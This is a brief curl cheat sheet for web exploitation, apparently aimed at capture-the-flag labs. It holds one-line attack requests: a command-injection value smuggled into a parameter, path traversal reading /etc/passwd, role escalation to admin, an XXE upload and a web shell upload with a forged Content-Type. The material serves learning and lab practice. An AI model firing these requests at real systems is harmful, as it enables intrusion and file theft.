# curl

The most important tool here: every exploit is ultimately one crafted HTTP request.

| Flag | Use |
|---|---|
| `-s` | silent | 
| `-i` / `-I` / `-D -` | show response headers / HEAD only / dump headers |
| `-v` | show request + response (debug what you actually sent) |
| `-L` | follow redirects |
| `-X POST` | method |
| `-d 'a=1&b=2'` | form body (implies POST; **does not** URL-encode) |
| `--data-urlencode 'a=x; id'` | form field, URL-encoded (use for payloads!) |
| `--data-binary @file` | raw body from file (XML, JSON) |
| `-H 'Header: v'` | any header (Referer, Host, X-Forwarded-For, Authorization, Content-Type) |
| `-b 'k=v; k2=v2'` / `-b jar` | send cookies / from jar |
| `-c jar` | save cookies (session) |
| `-u user:pass` | HTTP Basic |
| `-F 'file=@shell.php;type=image/png'` | multipart upload with forged Content-Type |
| `-G --data-urlencode 'q=...'` | put encoded data in the query string |
| `-o /dev/null -w '%{http_code} %{size_download} %{time_total}\n'` | status/size/time only (oracles!) |
| `--path-as-is` | don't normalise `../` |
| `-x http://127.0.0.1:8080` | through Burp |
| `-k` | ignore TLS errors |

## Patterns
```bash
curl -s -c j -b j -d 'username=employee&password=employee123' $T/login -L     # login, keep session
curl -s -b j $T/manager | grep -o 'flag{[^}]*}'
curl -s -H 'Content-Type: application/json' -d '{"role":"admin"}' $T/api/me
curl -s "$T/run?cmd=ls&cmd=ls%3b+id"                                           # literal encoded URL
curl -s --path-as-is "$T/static/../../../../etc/passwd"
curl -s -X POST $T/import -H 'Content-Type: application/xml' --data-binary @xxe.xml
```
Windows PowerShell: use `curl.exe` (plain `curl` is an alias of `Invoke-WebRequest`).
